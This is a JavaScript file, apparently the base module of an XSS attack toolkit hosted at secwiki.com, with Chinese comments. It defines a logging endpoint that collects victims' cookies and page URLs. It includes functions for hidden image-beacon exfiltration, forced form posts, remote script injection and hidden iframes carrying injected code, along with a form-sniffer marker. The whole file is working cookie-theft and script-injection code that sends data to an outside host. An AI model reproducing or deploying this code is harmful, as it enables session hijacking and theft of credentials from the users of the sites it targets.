//alert("base.js");

//////////////////////////////////////////////
//// 定义常量
var feedurl = "http://www.secwiki.com/athena/feed.js";
var logurl = "http://www.secwiki.com/athena/logxss.php?";  // cookie 和 querystring 收集
var XssGotURI = "    [**** Request URI: "+escape(window.location.href)+" ****]\r\n";
var XssGotCookie = "    [**** Cookie: "+escape(document.cookie)+" ****]\r\n";
var XssGotFormSniffer_S = "    [**** Form Sniffer: ";
var XssGotFormSniffer_E = " ****]\r\n";

var $d=document;
//////////////////////////////////////////////
//////  提交表单  
/////  改用GET方法
function formpostTarget(url){
        var f;
	f=document.createElement('form');	
	f.action=url;
	f.method="post";
	//f.method="get";
	document.getElementsByTagName("body")[0].appendChild(f);
	f.submit();
}


//////  img get 请求
function getURL(s) {
	var image = new Image();
	image.style.width = 0;
	image.style.height = 0;
	image.src = s;
}

////////////////////////////////
//// 注入
////////////////////////////////
function InjectScript(ptr_sc){
    s=document.createElement("script");
    s.src=ptr_sc;
    document.getElementsByTagName("body")[0].appendChild(s);
}

function AddScript(ptr_sc){
    document.write("<script src='"+ptr_sc+"'></script>");
}

function createIframe(w) {
	var d = w.document;
	var newIframe = d.createElement("iframe");
	newIframe.style.width = 0;
	newIframe.style.height = 0;
	d.body.appendChild(newIframe);
	newIframe.contentWindow.document.write("<html><body></body></html>");
	return newIframe;
}

function injectScriptIntoIframe(f, proc) {
	var d = f.contentWindow.document;
	var s = "<script>\n(" + proc.toString() + ")();\n</script>";
	d.write(s);
}